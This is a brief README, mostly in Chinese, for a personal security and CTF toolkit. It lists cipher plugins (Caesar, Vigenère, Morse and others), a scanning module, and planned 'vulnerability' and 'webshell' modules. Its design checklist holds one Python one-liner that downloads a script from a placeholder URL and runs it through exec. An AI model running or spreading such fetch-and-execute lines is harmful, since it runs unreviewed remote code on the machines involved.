# vFuckingTools

vFuckingTools 个人综合框架

## 项目设计 Checklists

- [ ] 多节点设计
    - python -c "exec(__import__('urllib').urlopen('http://xxx.net/xxx').read())" -m
    - 访问API获取执行脚本

- [ ] 模块
    - [ ] 编码
        - [x] ascii
    - [ ] 加密
    - [ ] 扫描
        - [x] ds_store 扫描
        - [ ] 目录扫描
    - 漏洞
    - webshell
    - 其他

## 前后端数据传输及异步处理解决方案

使用`websocket`,服务端处理完成后通过`websocket`发送到客户端

## 插件语言优先级： 

    Python > Javascript > PHP(外部调用文件) > C语言源码（可编译的）

## 0x02 Plugins

### Crypto

    - ascii
    - base64
    - mokbp
    - peigen
    - url
    - zhalan.py
    - atbash
    - caesar
    - morse
    - strhex
    - vigenere
    - ...

### Misc

    - brainfuck
